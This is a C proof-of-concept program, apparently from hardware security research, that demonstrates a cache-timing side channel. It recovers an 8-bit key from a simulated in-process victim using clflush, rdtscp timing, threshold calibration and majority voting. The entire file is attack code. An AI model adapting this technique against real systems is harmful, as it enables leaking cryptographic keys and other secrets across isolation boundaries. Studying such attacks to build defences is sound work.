#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define PAGE_SIZE 4096
#define XPT_SIZE 256
#define THRESHOLD_VAL 32
#define KEY_BITS 8
#define DUMMY_SIZE 128 

// 攻击配置
#define NUM_ROUNDS 7    // 总共测 7 轮（奇数方便投票）
#define CALIBRATE_SAMPLES 10 // 校准时采集的样本数

static inline void clflush(volatile void *p) { asm volatile("clflush (%0)" :: "r"(p)); }
static inline void mfence() { asm volatile("mfence" ::: "memory"); }
static inline void lfence() { asm volatile("lfence" ::: "memory"); }
static inline uint64_t rdtscp() { unsigned int junk; return __rdtscp(&junk); }

void busy_wait(int cycles) {
    for (volatile int i = 0; i < cycles; i++);
}

// 排序函数（用于找中位数）
int compare_uint32(const void *a, const void *b) {
    return (*(uint32_t*)a - *(uint32_t*)b);
}

void train_page(volatile char *addr) {
    for (int i = 0; i < THRESHOLD_VAL + 5; i++) {
        volatile char junk = *addr; mfence();
        clflush(addr); mfence();
    }
}

void flush_hardware_state(volatile char **dummy_pages) {
    for (int i = 0; i < DUMMY_SIZE; i++) {
        volatile char junk = *dummy_pages[i]; mfence();
        clflush(dummy_pages[i]); mfence();
    }
}

// 单次探测函数：bit 决定位置，dry_run 为 1 时强制不触发受害者（用于校准）
uint32_t probe_once(int bit, uint8_t secret_key, 
                    volatile char **attacker_pages, 
                    volatile char *victim_base,
                    volatile char **dummy_pages,
                    int dry_run) 
{
    flush_hardware_state(dummy_pages);

    // 1. Setup / Training
    for (int i = 0; i < XPT_SIZE; i++) train_page(attacker_pages[i]);

    // 2. Victim
    int current_bit_val = dry_run ? 0 : ((secret_key >> bit) & 1);
    if (current_bit_val) {
        volatile char *vp = victim_base;
        for (int repeat = 0; repeat < 2; repeat++) { 
            clflush(vp); 
            mfence();
            volatile char junk = *vp; 
            (void)junk; // 防止编译器警告
            mfence();
            busy_wait(100);
        }
    }

    // 3. Probe
    busy_wait(150);
    clflush(attacker_pages[0]); mfence(); lfence();
    
    uint64_t start = rdtscp();
    lfence();
    volatile char junk = *attacker_pages[0]; mfence();
    uint32_t lat = (uint32_t)(rdtscp() - start);
    return lat;
}

int main(int argc, char *argv[]) {
    uint32_t threshold = 0;
    int use_fixed_threshold = 0;

    // 解析命令行参数: ./test [optional_threshold]
    if (argc > 1) {
        threshold = (uint32_t)atoi(argv[1]);
        use_fixed_threshold = 1;
    }

    uint8_t secret_key = 0xef; // 目标密钥
    size_t mem_size = 4000 * PAGE_SIZE; 
    char *buffer = (char *)aligned_alloc(PAGE_SIZE, mem_size);
    memset(buffer, 0x55, mem_size);

    volatile char *attacker_pages[XPT_SIZE];
    for (int i = 0; i < XPT_SIZE; i++) attacker_pages[i] = &buffer[i * PAGE_SIZE];
    volatile char *victim_base = &buffer[1000 * PAGE_SIZE];
    volatile char *dummy_pages[DUMMY_SIZE];
    for (int i = 0; i < DUMMY_SIZE; i++) dummy_pages[i] = &buffer[(2000 + i) * PAGE_SIZE];

    // 记录每个 bit 被判定为 1 的次数
    int vote_box[KEY_BITS] = {0};

    printf("=== XPT STATISTICAL MULTI-ROUND ATTACK ===\n");
    printf("[ATTACK_DEBUG] attacker_pages[0] VADDR: %p (page-aligned: %p)\n", 
        attacker_pages[0], 
        (void*)((uintptr_t)attacker_pages[0] & ~0xFFF));
    printf("Target Key: 0x%02x\n\n", secret_key);

    // --- 第一步：校准 ---
    if (!use_fixed_threshold) {
        printf("[*] Calibrating Base Latency...\n");
    
        uint32_t cal_samples[CALIBRATE_SAMPLES];
        for(int i = 0; i < CALIBRATE_SAMPLES; i++) {
            cal_samples[i] = probe_once(0, 0, attacker_pages, victim_base, dummy_pages, 1);
            // 实时打印每一个样本值
            printf("  Sample %02d: %u\n", i + 1, cal_samples[i]);
        }

        // 排序
        qsort(cal_samples, CALIBRATE_SAMPLES, sizeof(uint32_t), compare_uint32);
        
        // 打印排序后的结果，方便看中位数位置
        printf("[*] Sorted Samples: ");
        for(int i = 0; i < CALIBRATE_SAMPLES; i++) printf("%u ", cal_samples[i]);
        printf("\n");

        uint32_t fast_median = cal_samples[CALIBRATE_SAMPLES / 2];
        // uint32_t threshold = fast_median + 40; 
        threshold = fast_median + 40; 
        // 关键：输出一个特定的前缀，方便 Bash 脚本抓取
        printf("RESULT_THRESHOLD:%u\n", threshold);
    } else {
        printf("[*] Using Oracle Threshold: %u\n", threshold);
    }

    // --- 第二步：多轮全扫描 ---
    for (int r = 0; r < NUM_ROUNDS; r++) {
        printf("Round %02d: ", r + 1);
        for (int b = KEY_BITS-1; b >= 0; b--) {
            uint32_t lat = probe_once(b, secret_key, attacker_pages, victim_base, dummy_pages, 0);
            
            int is_one = (lat > threshold) ? 1 : 0;
            vote_box[b] += is_one;
            
            // 修改这里：打印格式为 "判定(原始延迟)"
            printf("%d(%u) ", is_one, lat); 
        }
        printf("\n");
    }

    // --- 第三步：多数表决 ---
    uint8_t recovered = 0;
    printf("\n=== FINAL VOTING RESULTS ===\n");
    for (int b = 0; b < KEY_BITS; b++) {
        // 如果该位在超过一半的轮次中被判定为 1
        int final_guess = (vote_box[b] > (NUM_ROUNDS / 2)) ? 1 : 0;
        if (final_guess) recovered |= (1 << b);
        
        printf("Bit %d | Votes: %2d/%2d | Final: %d | %s\n", 
               b, vote_box[b], NUM_ROUNDS, final_guess, 
               (final_guess == ((secret_key >> b) & 1) ? "OK" : "FAIL"));
    }

    printf("\nRecovered Key: 0x%02x (Target: 0x%02x)\n", recovered, secret_key);

    free(buffer);
    return 0;
}